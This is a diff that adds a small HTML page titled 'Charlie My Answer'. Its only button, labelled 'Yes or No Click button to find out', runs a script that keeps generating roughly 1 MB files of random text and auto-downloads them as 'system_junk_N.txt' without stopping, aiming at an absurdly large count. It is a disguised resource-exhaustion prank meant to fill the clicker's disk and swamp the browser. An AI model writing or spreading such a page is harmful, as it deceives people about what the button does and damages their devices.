@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Charlie My Answer</title>
+    <script>
+        function startDownload() {
+            const button = document.getElementById('downloadBtn');
+            button.disabled = true;
+            button.textContent = 'Downloading...';
+            
+            let count = 0;
+            const total = 999999999999999999999999999;
+            
+            function downloadNext() {
+                // Create 1MB file content
+                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+                let content = '';
+                for (let i = 0; i < 1000000; i++) {
+                    content += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                
+                // Create file and download
+                const blob = new Blob([content], {type: 'text/plain'});
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `system_junk_${count + 1}.txt`;
+                document.body.appendChild(a);
+                a.click();
+                
+                // Clean up
+                setTimeout(() => {
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                }, 100);
+                
+                count++;
+                button.textContent = `Downloaded: ${count}/${total}`;
+                
+                if (count < total) {
+                    setTimeout(downloadNext, 0);
+                } else {
+                    button.textContent = ':)';
+                }
+            }
+            
+            downloadNext();
+        }
+    </script>
+</head>
+<body>
+    <button 
+        id="downloadBtn" 
+        onclick="startDownload()" 
+        style="
+            font-size: 20px;
+            padding: 15px 30px;
+            margin: 50px;
+            cursor: pointer;
+        "
+    >
+        Yes or No Click button to find out
+    </button>
+</body>
+</html>
